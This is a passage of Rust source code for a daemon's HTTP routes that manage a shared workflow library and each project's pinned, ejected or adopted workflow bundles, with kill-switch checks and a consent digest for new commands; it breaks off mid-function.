//! Workflows (`/workflows/*`, `/projects/{id}/workflows/*`).

use super::*;

pub(super) fn routes() -> Router<AppState> {
    Router::new()
        // The workflow library, and what one project uses out of it.
        //
        // The library is house-wide and hangs off no project — it is one folder on this machine,
        // shared by everything — while a pin belongs to a project and is stored in the project's
        // own files. Two prefixes, because they are two nouns and not two views of one.
        //
        // Everything that changes a pin is a POST or a DELETE on the project's side; nothing here
        // ever writes into the library, and that asymmetry is §6.3's second exit staying honest:
        // "edit it in the library" means the editor, not a form in this app.
        .route("/workflows/library", get(get_workflow_library))
        // `nucleos-core --workflow-sync <path>`: materialize a project's pinned workflows into a
        // worktree somebody made by hand. House-wide rather than under a project because the
        // caller does not know which project the path belongs to — the daemon finds out, from the
        // repository the worktree shares with a rostered root. In no scope table: it writes.
        .route("/workflows/sync", post(post_workflow_sync))
        .route(
            "/projects/{id}/workflows",
            get(get_project_workflows).post(post_project_workflow),
        )
        .route(
            "/projects/{id}/workflows/{name}",
            delete(delete_project_workflow),
        )
        .route(
            "/projects/{id}/workflows/{name}/eject",
            post(post_project_workflow_eject),
        )
        .route(
            "/projects/{id}/workflows/{name}/update",
            post(post_project_workflow_update),
        )
        .route(
            "/projects/{id}/workflows/{name}/diff",
            get(get_project_workflow_diff),
        )
        // Put the pinned bundle's files where agents read them (`workflows/materialize.rs`). The GET
        // is the same computation with nothing written — which files would be written, replaced,
        // adopted, removed, and which are left alone because somebody edited them. Both in no scope
        // table: the POST writes files that govern what an agent does, and the GET names them.
        .route(
            "/projects/{id}/workflows/{name}/materialize",
            get(get_project_workflow_materialize).post(post_project_workflow_materialize),
        )
        .route(
            "/projects/{id}/workflows/{name}/graph",
            get(get_project_workflow_graph),
        )
        // Every command a bundle version would run in this project, verbatim, and which of them
        // differ from what the project runs today. What the install and update screens show before
        // the person agrees — slice 10. A GET that writes nothing, in no scope table.
        .route(
            "/projects/{id}/workflows/{name}/consent",
            get(get_project_workflow_consent),
        )
        // What this project overrides on one node. Under the workflow's name and then the node's,
        // because that is what it is — and a flat `/overlay` taking both in the body would make the
        // one thing being changed invisible in the log.
        .route(
            "/projects/{id}/workflows/{name}/nodes/{node}",
            post(post_project_workflow_node),
        )
        // Adopting is not installing and gets its own route rather than a flag on that one: it
        // takes a folder instead of a coordinate, copies nothing, and produces a pin that no
        // library can ever update. One route with two meanings would hide exactly that.
        .route(
            "/projects/{id}/workflows/adopt",
            post(post_project_workflow_adopt),
        )
        // Publishing is the only door that writes INTO the library, which the comment at the top
        // says nothing else here does. Two routes for the two sources (§7.3) — a version of the
        // library, or a project's own copy — because the second needs a project and the first has
        // none. Both create a version that never changes; neither can overwrite one.
        .route("/workflows/{name}/publish", post(post_workflow_publish))
        .route(
            "/projects/{id}/workflows/{name}/publish",
            post(post_project_workflow_publish),
        )
}

/* ------------------------------------------------------------- workflows -- */

/// Where the library is on this machine, refused as one answer when there is nowhere for it to be.
///
/// A machine with no home directory has no library. `503` rather than `500`: nothing broke, the
/// answer simply does not exist here, and the page says so instead of showing an empty shelf that
/// reads as "you have installed nothing".
pub(super) fn library_or_refusal(
    state: &AppState,
) -> Result<PathBuf, (StatusCode, Json<serde_json::Value>)> {
    state
        .workflow_library
        .clone()
        .ok_or_else(|| refusal(StatusCode::SERVICE_UNAVAILABLE, "no_library"))
}

/// Every bundle on this machine, whatever any project uses.
///
/// House-wide, under `/workflows` and not under a project, because that is what it is: one folder
/// shared by everything. A library route hanging off a project id would answer identically for
/// every project and teach the shell a relationship that does not exist.
pub(super) async fn get_workflow_library(
    State(state): State<AppState>,
) -> Result<Json<Vec<crate::workflows::Bundle>>, (StatusCode, Json<serde_json::Value>)> {
    let root = library_or_refusal(&state)?;
    tokio::task::spawn_blocking(move || crate::workflows::library(&root))
        .await
        .map_err(|_| refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal"))?
        .map(Json)
        .map_err(|error| {
            tracing::warn!(%error, "reading the workflow library failed");
            refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal")
        })
}

/// What this project uses, measured against the library as it is right now.
///
/// The measurement is the point. A listing that only replayed the pins file would say `referenced`
/// for a bundle somebody has since edited, rewritten or deleted — which is the exact silence §6.1
/// asks this page to break.
pub(super) async fn get_project_workflows(
    State(state): State<AppState>,
    Path(id): Path<String>,
) -> Result<Json<Vec<crate::workflows::Installed>>, (StatusCode, Json<serde_json::Value>)> {
    let root = resolve_project_root(&state, &id)
        .await
        .map_err(|status| refusal(status, "no_project_root"))?;
    let library = library_or_refusal(&state)?;
    let pins = pins_file(&state, &id)?;
    let shown = crate::project::state::display_path(&id, crate::project::state::PINS_FILE);
    tokio::task::spawn_blocking(move || crate::workflows::installed(&root, &pins, &library))
        .await
        .map_err(|_| refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal"))?
        .map(Json)
        // The parser's own words, the same as `POST /write`'s `invalid`: a pins file that will not
        // load is a file somebody has to fix, and "unprocessable entity" does not say which line.
        // Prefixed with where the file is, because that is no longer the project's folder and the
        // page should not have to know where the daemon keeps it.
        .map_err(|detail| {
            (
                StatusCode::UNPROCESSABLE_ENTITY,
                Json(serde_json::json!({
                    "refusal": "unreadable_pins",
                    "detail": format!("{shown}: {detail}"),
                })),
            )
        })
}

#[derive(Deserialize)]
pub(super) struct InstallRequest {
    pub(super) name: String,
    pub(super) version: String,
    /// The digest of the consent listing the person was shown (`consent::digest`). Required when
    /// the bundle has a command node that is new or changed; see [`require_consent`].
    #[serde(default)]
    pub(super) consent_digest: Option<String>,
}

/// Turn a `workflows::Refused` into the status code that matches what it says.
pub(super) fn workflow_status(refused: &crate::workflows::Refused) -> (StatusCode, &'static str) {
    match refused {
        crate::workflows::Refused::NoSuchBundle => (StatusCode::NOT_FOUND, "no_such_bundle"),
        crate::workflows::Refused::NotInstalled => (StatusCode::NOT_FOUND, "not_installed"),
        crate::workflows::Refused::BadName => (StatusCode::UNPROCESSABLE_ENTITY, "bad_name"),
        crate::workflows::Refused::AlreadyEjected => (StatusCode::CONFLICT, "already_ejected"),
        // 409 beside it, and its own name: both are "you already have a copy", and they differ in
        // where the copy came from — which decides what the page offers next.
        crate::workflows::Refused::Adopted => (StatusCode::CONFLICT, "adopted"),
        // 404 and not 422: the bundle is fine, it simply does not have a graph in it yet. A
        // "cannot process" would send somebody looking for a syntax error in a file that is not
        // there.
        crate::workflows::Refused::NoGraph => (StatusCode::NOT_FOUND, "no_graph"),
        crate::workflows::Refused::InvalidGraph(_) => {
            (StatusCode::UNPROCESSABLE_ENTITY, "invalid_graph")
        }
        // 409: the version exists and is immutable, which is the answer to "publish it again" and
        // nothing about the request being malformed.
        crate::workflows::Refused::AlreadyPublished => (StatusCode::CONFLICT, "already_published"),
        crate::workflows::Refused::NotEjected => (StatusCode::CONFLICT, "not_ejected"),
        crate::workflows::Refused::Io(_) => (StatusCode::INTERNAL_SERVER_ERROR, "internal"),
    }
}

pub(super) fn workflow_refusal(
    refused: crate::workflows::Refused,
) -> (StatusCode, Json<serde_json::Value>) {
    let (status, name) = workflow_status(&refused);
    (
        status,
        Json(serde_json::json!({ "refusal": name, "detail": refused.to_string() })),
    )
}

/// Find one bundle in the library, or say which half is missing.
pub(super) fn bundle_or_refusal(
    library: &std::path::Path,
    name: &str,
    version: Option<&str>,
) -> Result<crate::workflows::Bundle, crate::workflows::Refused> {
    if !crate::workflows::valid_name(name) {
        return Err(crate::workflows::Refused::BadName);
    }
    let shelf = crate::workflows::library(library)
        .map_err(|e| crate::workflows::Refused::Io(e.to_string()))?;
    let mut candidates: Vec<_> = shelf
        .into_iter()
        .filter(|bundle| bundle.name == name)
        .filter(|bundle| version.is_none_or(|wanted| bundle.version == wanted))
        .collect();
    // Newest last, so `None` for the version means "the latest there is" — which is what an update
    // asks for when the page offered it a version it read from this same listing.
    candidates.sort_by(|a, b| crate::workflows::compare_versions(&a.version, &b.version));
    candidates
        .pop()
        .ok_or(crate::workflows::Refused::NoSuchBundle)
}

/// This project's pins file, `~/.nucleos/projects/<id>/workflows.yaml`, or the refusal
/// [`project_state_dir`] gives for a project with no state directory.
pub(super) fn pins_file(
    state: &AppState,
    id: &str,
) -> Result<PathBuf, (StatusCode, Json<serde_json::Value>)> {
    Ok(project_state_dir(state, id)?.join(crate::project::state::PINS_FILE))
}

/// Every route below writes this project's pins, so every one of them asks the same two questions
/// first, in the same order, for the reasons `POST /write` sets out at length.
///
/// **The kill switch first.** These write the project's `workflows.yaml`, and one of them copies a
/// whole bundle into `.nucleos/workflows/` — bytes in the project's folder, which §7.5 says must go
/// the way an agent's write goes. That is the line `POST /commands` sits on the other side of: that
/// one writes a database row and touches nothing on disk.
///
/// Answers the project root (where an ejected copy goes), the pins file (in the project's state
/// directory, never in the project) and the library.
pub(super) async fn workflow_write_root(
    state: &AppState,
    id: &str,
) -> Result<(PathBuf, PathBuf, PathBuf), (StatusCode, Json<serde_json::Value>)> {
    let halted = crate::governance::autopilot::kill_switch_engaged(&state.pool)
        .await
        .unwrap_or(true)
        || crate::governance::autopilot::scoped_kill_engaged(&state.pool, "project", id)
            .await
            .unwrap_or(true);
    if halted {
        return Err(refusal(StatusCode::LOCKED, "kill_switch"));
    }
    let root = resolve_project_root(state, id)
        .await
        .map_err(|status| refusal(status, "no_project_root"))?;
    Ok((root, pins_file(state, id)?, library_or_refusal(state)?))
}

/// Pin a bundle to this project.
///
/// The version is required, unlike the update route below. Installing is choosing, and a request
/// that said only `harness` would silently mean something different next week — which is the
/// property a pin exists to remove.
pub(super) async fn post_project_workflow(
    State(state): State<AppState>,
    Path(id): Path<String>,
    Json(body): Json<InstallRequest>,
) -> Result<StatusCode, (StatusCode, Json<serde_json::Value>)> {
    let (root, pins, library) = workflow_write_root(&state, &id).await?;
    consent_gate(
        root.clone(),
        pins.clone(),
        library.clone(),
        body.name.clone(),
        Some(body.version.clone()),
        body.consent_digest.clone(),
    )
    .await?;
    let record = materialized_record(&state, &id)?;
    let project_id = id.clone();
    let agents_home = agents_home(&state);

    let (installed, placed) = tokio::task::spawn_blocking(move || {
        let bundle = bundle_or_refusal(&library, &body.name, Some(&body.version))?;
        check_bundle_agent_facts(&bundle, agents_home.as_deref())?;
        crate::workflows::install(&pins, &bundle)?;
        let placed = materialize_after_pin(&root, &pins, &library, &record, &bundle.name);
        Ok::<_, crate::workflows::Refused>((bundle, placed))
    })
    .await
    .map_err(|_| refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal"))?
    .map_err(workflow_refusal)?;

    workflow_feed(
        &state,
        &project_id,
        &format!(
            "{}@{} installed from the app{placed}",
            installed.name, installed.version
        ),
    )
    .await;
    Ok(StatusCode::NO_CONTENT)
}

/// Where the installed agent packages live, `<machine root>/agents` (the same place the launcher
/// and `startup` read). `None` on a state with no machine root.
fn agents_home(state: &AppState) -> Option<PathBuf> {
    state
        .machine_config_root
        .as_ref()
        .map(|root| root.join("agents"))
}

/// Refuse a bundle whose decisions compare an agent node's fact to a value that agent never
/// declares (`workflows::graph::check_agent_facts`), before it is pinned.
///
/// Lenient about everything that is not that one mistake: a bundle with no graph, or one that does
/// not parse, passes here (`consent_gate` already reported a parse failure), and an agent that is
/// not installed or has no readable `output.md` is skipped, since installing a workflow must not
/// depend on the order its agents were installed in.
fn check_bundle_agent_facts(
    bundle: &crate::workflows::Bundle,
    agents_home: Option<&std::path::Path>,
) -> Result<(), crate::workflows::Refused> {
    let Some(graph) = graph_in(std::path::Path::new(&bundle.path)) else {
        return Ok(());
    };
    crate::workflows::graph::check_agent_facts(&graph, |reference| {
        let home = agents_home?;
        let reference = crate::agents::package::PackageRef::parse(reference).ok()?;
        let package = crate::agents::package::load_installed(home, &reference).ok()?;
        crate::agents::output::parse_output_md(&package.output_md).ok()
    })
    .map_err(crate::workflows::Refused::InvalidGraph)
}

/// This project's materialization record, `~/.nucleos/projects/<id>/materialized.yaml`.
pub(super) fn materialized_record(
    state: &AppState,
    id: &str,
) -> Result<PathBuf, (StatusCode, Json<serde_json::Value>)> {
    Ok(project_state_dir(state, id)?.join(crate::project::state::MATERIALIZED_FILE))
}

/// Put a just-pinned workflow's files into the project, and say in a few words what happened.
///
/// **After the pin, and never undoing it.** The pin is the decision a person made; placing the
/// files is its consequence, and a file that could not be placed — or one left alone because it
/// was edited — is something to be told about, not a reason to take the decision back. The answer
/// is the tail of the feed line, and `GET .../materialize` shows the whole report.
pub(super) fn materialize_after_pin(
    root: &std::path::Path,
    pins: &std::path::Path,
    library: &std::path::Path,
    record: &std::path::Path,
    name: &str,
) -> String {
    use crate::workflows::materialize;
    match materialize::sync(
        root,
        pins,
        library,
        record,
        Some(name),
        materialize::Mode::Apply,
    ) {
        Ok(outcomes) => outcomes
            .into_iter()
            .find_map(|outcome| match (outcome.report, outcome.error) {
                (_, Some(error)) => Some(format!("; its files could not all be placed: {error}")),
                (Some(report), None) if !report.is_empty() => {
                    Some(format!("; files — {}", report.summary()))
                }
                _ => None,
            })
            .unwrap_or_default(),
        Err(error) => {
            tracing::warn!(%error, workflow = name, "a workflow was pinned and its files were not placed");
            format!("; its files were not placed: {error}")
        }
    }
}

/// Stop using a workflow, and take back the files it placed in the project.
///
/// The pin goes first — a project that does not use `name` is refused before a file is touched —
/// and then `workflows::materialize::unmaterialize` removes every file the record says this workflow
/// wrote and that is still exactly what it wrote, the managed block in `AGENTS.md` included. An
/// edited or missing file stays and is named under `kept`; what went is under `removed`.
///
/// **Only the project's own root is cleaned.** A worktree synced from it keeps its copies and its
/// own record under `materialized/` until it is synced again or removed. Never deletes an ejected
/// copy — see `workflows::uninstall`. A cleanup that could not run (an unreadable record) does not
/// undo the decision: the pin stays gone, nothing is removed, and the answer carries `error`.
pub(super) async fn delete_project_workflow(
    State(state): State<AppState>,
    Path((id, name)): Path<(String, String)>,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let (root, pins, _) = workflow_write_root(&state, &id).await?;
    let record = materialized_record(&state, &id)?;
    let stopped = name.clone();

    let cleaned = tokio::task::spawn_blocking(move || {
        crate::workflows::uninstall(&pins, &name)?;
        Ok::<_, crate::workflows::Refused>(crate::workflows::materialize::unmaterialize(
            &root, &record, &name,
        ))
    })
    .await
    .map_err(|_| refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal"))?
    .map_err(workflow_refusal)?;

    let (removal, error) = match cleaned {
        Ok(removal) => (removal, None),
        Err(error) => {
            tracing::warn!(%error, workflow = %stopped, "a workflow was stopped and its files were not removed");
            (Default::default(), Some(error))
        }
    };
    let tail = match (&error, removal.removed.len(), removal.kept.len()) {
        (Some(error), _, _) => format!("; its files were not removed: {error}"),
        (None, 0, 0) => String::new(),
        (None, removed, 0) => format!("; {removed} of its files removed"),
        (None, removed, kept) => {
            format!("; {removed} of its files removed, {kept} left in place")
        }
    };
    workflow_feed(
        &state,
        &id,
        &format!("{stopped} is no longer used here{tail}"),
    )
    .await;
    Ok(Json(serde_json::json!({
        "removed": removal.removed,
        "kept": removal.kept,
        "error": error,
    })))
}

/// Take a copy, and stop receiving updates.
///
/// The one route here that puts a whole tree in somebody's repository, so it is the one the
/// disclosure in §6.3 guards. It refuses rather than overwriting when a copy is already there: the
/// edits in it are the entire reason it exists.
pub(super) async fn post_project_workflow_eject(
    State(state): State<AppState>,
    Path((id, name)): Path<(String, String)>,
) -> Result<StatusCode, (StatusCode, Json<serde_json::Value>)> {
    let (root, pins, library) = workflow_write_root(&state, &id).await?;
    let now = chrono::Utc::now();
    let ejected = name.clone();

    tokio::task::spawn_blocking(move || {
        // The pinned version and not the newest: ejecting is taking a copy of what this project
        // uses, and quietly taking a copy of something else would be an upgrade nobody asked for
        // performed at the one moment updates stop arriving.
        let pinned = crate::workflows::read_pins(&pins)
            .map_err(crate::workflows::Refused::Io)?
            .workflows
            .into_iter()
            .find(|pin| pin.name == name)
            .ok_or(crate::workflows::Refused::NotInstalled)?;
        let bundle = bundle_or_refusal(&library, &name, Some(&pinned.version))?;
        crate::workflows::eject(&root, &pins, &bundle, now)
    })
    .await
    .map_err(|_| refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal"))?
    .map_err(workflow_refusal)?;

    workflow_feed(
        &state,
        &id,
        &format!("{ejected} ejected: this project now has its own copy"),
    )
    .await;
    Ok(StatusCode::NO_CONTENT)
}

#[derive(Deserialize)]
pub(super) struct UpdateRequest {
    /// Absent means the newest the library has. The page always sends the version it showed, so
    /// this is the CLI's affordance rather than the shell's.
    #[serde(default)]
    pub(super) version: Option<String>,
    /// The digest of the consent listing the person was shown; see [`require_consent`].
    #[serde(default)]
    pub(super) consent_digest: Option<String>,
}

/// Take the origin's current bytes.
///
/// For a referenced workflow this re-stamps the pin. **For an ejected one it replaces the project's
/// copy**, which is what update means — and why the page puts the diff in front of the button
/// rather than beside it.
pub(super) async fn post_project_workflow_update(
    State(state): State<AppState>,
    Path((id, name)): Path<(String, String)>,
    Json(body): Json<UpdateRequest>,
) -> Result<StatusCode, (StatusCode, Json<serde_json::Value>)> {
    let (root, pins, library) = workflow_write_root(&state, &id).await?;
    consent_gate(
        root.clone(),
        pins.clone(),
        library.clone(),
        name.clone(),
        body.version.clone(),
        body.consent_digest.clone(),
    )
    .await?;
    let record = materialized_record(&state, &id)?;
    let now = chrono::Utc::now();
    let project_id = id.clone();
    let agents_home = agents_home(&state);

    let (bundle, placed) = tokio::task::spawn_blocking(move || {
        let bundle = bundle_or_refusal(&library, &name, body.version.as_deref())?;
        check_bundle_agent_facts(&bundle, agents_home.as_deref())?;
        crate::workflows::update(&root, &pins, &bundle, now)?;
        let placed = materialize_after_pin(&root, &pins, &library, &record, &bundle.name);
        Ok::<_, crate::workflows::Refused>((bundle, placed))
    })
    .await
    .map_err(|_| refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal"))?
    .map_err(workflow_refusal)?;

    workflow_feed(
        &state,
        &project_id,
        &format!(
            "{}@{} taken from the library{placed}",
            bundle.name, bundle.version
        ),
    )
    .await;
    Ok(StatusCode::NO_CONTENT)
}

/// What this project's copy has that the origin does not.
#[derive(serde::Serialize)]
pub(super) struct WorkflowDiff {
    /// The bundle both sides were measured against, so the answer names what it compared.
    pub(super) origin_version: String,
    pub(super) changes: Vec<crate::workflows::FileChange>,
    /// Files that are identical in both. Counted rather than listed: the interesting half is the
    /// short one, and a hundred unchanged paths would bury it.
    pub(super) unchanged: usize,
}

/// The diff §6.1 asks for, file by file.
///
/// Only for an ejected workflow, and the 409 says so rather than answering with an empty list. A
/// referenced bundle IS the library's — there is no second copy to compare — so "no differences"
/// would be true and useless, and would read as *your copy matches* to somebody who has no copy.
pub(super) async fn get_project_workflow_diff(
    State(state): State<AppState>,
    Path((id, name)): Path<(String, String)>,
) -> Result<Json<WorkflowDiff>, (StatusCode, Json<serde_json::Value>)> {
    let root = resolve_project_root(&state, &id)
        .await
        .map_err(|status| refusal(status, "no_project_root"))?;
    let library = library_or_refusal(&state)?;
    let pins = pins_file(&state, &id)?;

    tokio::task::spawn_blocking(move || {
        let pinned = crate::workflows::read_pins(&pins)
            .map_err(crate::workflows::Refused::Io)?
            .workflows
            .into_iter()
            .find(|pin| pin.name == name)
            .ok_or(crate::workflows::Refused::NotInstalled)?;
        let mine = crate::workflows::copy_path(&root, &pinned)
            .filter(|path| path.is_dir())
            .ok_or(crate::workflows::Refused::NotInstalled)?;
        let bundle = bundle_or_refusal(&library, &name, Some(&pinned.version))?;

        let mine = crate::workflows::file_hashes(&mine)
            .map_err(|e| crate::workflows::Refused::Io(e.to_string()))?;
        let theirs = crate::workflows::file_hashes(std::path::Path::new(&bundle.path))
            .map_err(|e| crate::workflows::Refused::Io(e.to_string()))?;
        let changes = crate::workflows::compare(&mine, &theirs);
        Ok::<_, crate::workflows::Refused>(WorkflowDiff {
            origin_version: bundle.version,
            unchanged: mine.len()
                - changes
                    .iter()
                    .filter(|c| c.change != crate::workflows::Change::Removed)
                    .count(),
            changes,
        })
    })
    .await
    .map_err(|_| refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal"))?
    .map(Json)
    .map_err(workflow_refusal)
}

/// The graph a project's canvas draws, with this project's overlay painted on.
#[derive(serde::Serialize)]
pub(super) struct GraphView {
    /// Which copy this came out of. `project` for an ejected workflow, `library` otherwise.
    ///
    /// Said out loud because it changes what editing the graph would mean: one is this project's
    /// file and the other is shared by every project that references the bundle, which is the whole
    /// of §6.3.
    pub(super) source: &'static str,
    pub(super) version: String,
    #[serde(flatten)]
    pub(super) resolved: crate::workflows::graph::Resolved,
}

/// What this project's workflow looks like, ready to be drawn.
///
/// **The graph comes from the copy the project actually uses.** An ejected workflow is drawn from
/// the folder in the project, because that is the one that would run; a referenced one from the
/// library. Reading the library's for an ejected workflow would draw a picture of somebody else's
/// bundle and label it as theirs.
///
/// Four refusals, and `no_graph` is the one worth naming separately. A bundle with skills and
/// scripts and no sequence yet is an ordinary halfway state, not a broken bundle — and a page that
/// reported it as a parse failure would send somebody looking for a syntax error in a file that is
/// not there.
pub(super) async fn get_project_workflow_graph(
    State(state): State<AppState>,
    Path((id, name)): Path<(String, String)>,
) -> Result<Json<GraphView>, (StatusCode, Json<serde_json::Value>)> {
    let root = resolve_project_root(&state, &id)
        .await
        .map_err(|status| refusal(status, "no_project_root"))?;
    let library = library_or_refusal(&state)?;
    let pins = pins_file(&state, &id)?;

    tokio::task::spawn_blocking(move || {
        let pinned = crate::workflows::read_pins(&pins)
            .map_err(crate::workflows::Refused::Io)?
            .workflows
            .into_iter()
            .find(|pin| pin.name == name)
            .ok_or(crate::workflows::Refused::NotInstalled)?;

        // `copy_path` and not `ejected_path`: an adopted workflow's copy is the folder the project
        // already had — `.ai/` here — rather than the one an eject would have created. Reading the
        // library instead would draw somebody else's bundle and label it as this project's.
        let mine = crate::workflows::copy_path(&root, &pinned).filter(|path| path.is_dir());
        let (source, from) = match mine {
            Some(path) => ("project", path),
            None => (
                "library",
                std::path::PathBuf::from(
                    bundle_or_refusal(&library, &name, Some(&pinned.version))?.path,
                ),
            ),
        };

        let text = std::fs::read_to_string(from.join(crate::workflows::graph::GRAPH_FILE))
            .map_err(|error| match error.kind() {
                std::io::ErrorKind::NotFound => crate::workflows::Refused::NoGraph,
                _ => crate::workflows::Refused::Io(error.to_string()),
            })?;
        let graph = crate::workflows::graph::parse(&text)
            .map_err(crate::workflows::Refused::InvalidGraph)?;

        Ok::<_, crate::workflows::Refused>(GraphView {
            source,
            version: pinned.version,
            resolved: crate::workflows::graph::resolve(&graph, &pinned.nodes),
        })
    })
    .await
    .map_err(|_| refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal"))?
    .map(Json)
    .map_err(workflow_refusal)
}

#[derive(Deserialize)]
pub(super) struct ConsentQuery {
    /// The version about to be installed or updated to. Absent means the newest the library has,
    /// which is what an update without a version would take.
    #[serde(default)]
    pub(super) version: Option<String>,
}

/// Read a graph out of a bundle folder, or `None` when there is no readable graph in it.
fn graph_in(dir: &std::path::Path) -> Option<crate::workflows::graph::Graph> {
    let text = std::fs::read_to_string(dir.join(crate::workflows::graph::GRAPH_FILE)).ok()?;
    crate::workflows::graph::parse(&text).ok()
}

/// The consent listing for installing or updating `name` to `version` (newest when `None`), the
/// computation behind `GET .../consent` and behind the digest the POSTs check.
fn compute_consent(
    root: &std::path::Path,
    pins: &std::path::Path,
    library: &std::path::Path,
    name: &str,
    version: Option<&str>,
) -> Result<crate::workflows::consent::Consent, crate::workflows::Refused> {
    let target = bundle_or_refusal(library, name, version)?;
    let target_graph = match std::fs::read_to_string(
        std::path::Path::new(&target.path).join(crate::workflows::graph::GRAPH_FILE),
    ) {
        Ok(text) => crate::workflows::graph::parse(&text)
            .map_err(crate::workflows::Refused::InvalidGraph)?,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
            crate::workflows::graph::Graph::default()
        }
        Err(error) => return Err(crate::workflows::Refused::Io(error.to_string())),
    };

    let pinned = crate::workflows::read_pins(pins)
        .map_err(crate::workflows::Refused::Io)?
        .workflows
        .into_iter()
        .find(|pin| pin.name == name);

    let baseline = match &pinned {
        None => None,
        Some(pin) => {
            let mine = crate::workflows::copy_path(root, pin).filter(|path| path.is_dir());
            let (source, graph) = match mine {
                Some(path) => ("project", graph_in(&path)),
                None => (
                    "library",
                    bundle_or_refusal(library, name, Some(&pin.version))
                        .ok()
                        .and_then(|bundle| graph_in(std::path::Path::new(&bundle.path))),
                ),
            };
            Some((pin.version.clone(), source, graph.unwrap_or_default()))
        }
    };
    let overlay = pinned
        .as_ref()
        .map(|pin| pin.nodes.clone())
        .unwrap_or_default();

    Ok::<_, crate::workflows::Refused>(crate::workflows::consent::consent(
        &target.version,
        &target_graph,
        baseline
            .as_ref()
            .map(|(version, source, graph)| (version.as_str(), *source, graph)),
        &overlay,
    ))
}

/// Refuse with `422 consent_required` unless the person agreed to exactly these commands.
///
/// Slice 10, server side. The listing is recomputed here, at POST time, so a bundle edited between
/// the listing and the POST no longer matches the digest the shell sends back and the person is
/// asked again. Nothing to agree to (no command node is new or changed) needs no digest. The body
/// is the `Consent` itself, plus the `refusal` name and the `digest` that would be accepted.
fn require_consent(
    consent: &crate::workflows::consent::Consent,
    given: Option<&str>,
) -> Result<(), (StatusCode, Json<serde_json::Value>)> {
    use crate::workflows::consent::{digest, needs_ack};
    let expected = digest(consent);
    if !needs_ack(consent) || given == Some(expected.as_str()) {
        return Ok(());
    }
    let mut body = serde_json::to_value(consent).unwrap_or_else(|_| serde_json::json!({}));
    if let Some(map) = body.as_object_mut() {
        map.insert("refusal".into(), "consent_required".into());
        map.insert("digest".into(), expected.into());
    }
    Err((StatusCode::UNPROCESSABLE_ENTITY, Json(body)))
}

/// [`compute_consent`] off the async thread, for the three POSTs that enforce it.
async fn consent_gate(
    root: PathBuf,
    pins: PathBuf,
    library: PathBuf,
    name: String,
    version: Option<String>,
    given: Option<String>,
) -> Result<(), (StatusCode, Json<serde_json::Value>)> {
    let consent = tokio::task::spawn_blocking(move || {
        compute_consent(&root, &pins, &library, &name, version.as_deref())
    })
    .await
    .map_err(|_| refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal"))?
    .map_err(workflow_refusal)?;
    require_consent(&consent, given.as_deref())
}

/// What installing or updating to this version would let run, so the person can agree to exactly
/// that.
///
/// **The target is the library's bundle, and the baseline is the copy the project runs today** —
/// its own folder when it has one (an ejected or adopted workflow), the library's pinned version
/// otherwise. A project with no pin has no baseline, and every command is then new.
///
/// A target bundle with no graph lists nothing: it has no command nodes, and that is an answer. A
/// target graph that does not parse is refused with the parser's words, because installing it
/// would pin something the canvas cannot draw. A baseline that will not parse is treated as empty,
/// which errs toward showing more as new rather than refusing the update that would fix it.
pub(super) async fn get_project_workflow_consent(
    State(state): State<AppState>,
    Path((id, name)): Path<(String, String)>,
    Query(query): Query<ConsentQuery>,
) -> Result<Json<crate::workflows::consent::Consent>, (StatusCode, Json<serde_json::Value>)> {
    let root = resolve_project_root(&state, &id)
        .await
        .map_err(|status| refusal(status, "no_project_root"))?;
    let library = library_or_refusal(&state)?;
    let pins = pins_file(&state, &id)?;

    tokio::task::spawn_blocking(move || {
        compute_consent(&root, &pins, &library, &name, query.version.as_deref())
    })
    .await
    .map_err(|_| refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal"))?
    .map(Json)
    .map_err(workflow_refusal)
}

#[derive(Deserialize)]
pub(super) struct OverlayRequest {
    /// Absent means *inherit*, which is a third answer that `false` would have collapsed into
    /// "explicitly on". The same reasoning as the fields below.
    #[serde(default)]
    pub(super) disabled: Option<bool>,
    #[serde(default)]
    pub(super) model: Option<String>,
    #[serde(default)]
    pub(super) tool: Option<String>,
    #[serde(default)]
    pub(super) command: Option<String>,
}

/// Change what this project overrides on one node — or clear it back to inherited.
///
/// **A write, so the stop applies.** It puts bytes in the project's `workflows.yaml`, which the app
/// holds on the project's behalf, and §7.5 says that goes the way an agent's write goes.
///
/// A body in which everything is absent clears the row, because an override that overrides nothing
/// is not an override. That makes "go back to what the bundle says" the same request with an empty
/// body rather than a second route with a different verb.
pub(super) async fn post_project_workflow_node(
    State(state): State<AppState>,
    Path((id, name, node)): Path<(String, String, String)>,
    Json(body): Json<OverlayRequest>,
) -> Result<StatusCode, (StatusCode, Json<serde_json::Value>)> {
    let (_, pins, _) = workflow_write_root(&state, &id).await?;
    let said = format!("{name}/{node} overridden in this project");

    let overlay = crate::workflows::NodeOverlay {
        disabled: body.disabled,
        // Empty is cleared, not "the empty model". A form that sends "" for a field somebody
        // emptied has to be able to mean *stop overriding this*, and there is no model, tool or
        // command whose name is nothing.
        model: body.model.filter(|value| !value.trim().is_empty()),
        tool: body.tool.filter(|value| !value.trim().is_empty()),
        command: body.command.filter(|value| !value.trim().is_empty()),
    };

    tokio::task::spawn_blocking(move || {
        crate::workflows::set_overlay(&pins, &name, &node, Some(overlay))
    })
    .await
    .map_err(|_| refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal"))?
    .map_err(workflow_refusal)?;

    workflow_feed(&state, &id, &said).await;
    Ok(StatusCode::NO_CONTENT)
}

#[derive(Deserialize)]
pub(super) struct AdoptRequest {
    /// What to call it. The project's own choice: an adopted folder has no published name.
    pub(super) name: String,
    /// The folder, relative to the project root — `.ai`, `.claude`.
    pub(super) path: String,
    /// The digest of the consent listing the person was shown; see [`require_consent`].
    #[serde(default)]
    pub(super) consent_digest: Option<String>,
}

/// The consent listing for adopting `path` (relative to `root`): the folder's own graph, with no
/// baseline. A folder with no readable graph, or a path that leaves the project, lists nothing;
/// `workflows::adopt` refuses the second itself.
fn adopt_consent(root: &std::path::Path, path: &str) -> crate::workflows::consent::Consent {
    let relative = std::path::Path::new(path);
    let stays_inside = !path.trim().is_empty()
        && relative
            .components()
